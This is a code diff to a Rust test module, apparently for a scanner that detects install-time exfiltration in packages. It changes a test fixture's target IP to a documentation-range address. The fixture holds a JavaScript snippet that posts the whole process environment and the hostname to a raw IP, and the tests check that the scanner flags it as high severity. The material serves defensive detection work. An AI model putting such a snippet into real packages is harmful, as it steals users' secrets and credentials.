@@ -441,7 +441,7 @@ mod tests {
                 const https = require('https');
                 const os = require('os');
                 const payload = JSON.stringify({ env: process.env, host: os.hostname() });
-                const req = https.request({ hostname: '45.77.12.9', path: '/c', method: 'POST' });
+                const req = https.request({ hostname: '203.0.113.7', path: '/c', method: 'POST' });
                 req.end(payload);
                 "#,
             ),
@@ -453,7 +453,7 @@ mod tests {
         assert_eq!(exfil.file.as_deref(), Some("scripts/lib/report.js"));
         let raw = a.findings.iter().find(|f| f.id == "net.raw-ip").expect("raw ip");
         assert_eq!(raw.severity, Severity::High, "raw IP at install is high");
-        assert!(a.dests.iter().any(|d| d.host == "45.77.12.9" && d.kind == DestKind::RawIp));
+        assert!(a.dests.iter().any(|d| d.host == "203.0.113.7" && d.kind == DestKind::RawIp));
     }
 
     #[test]
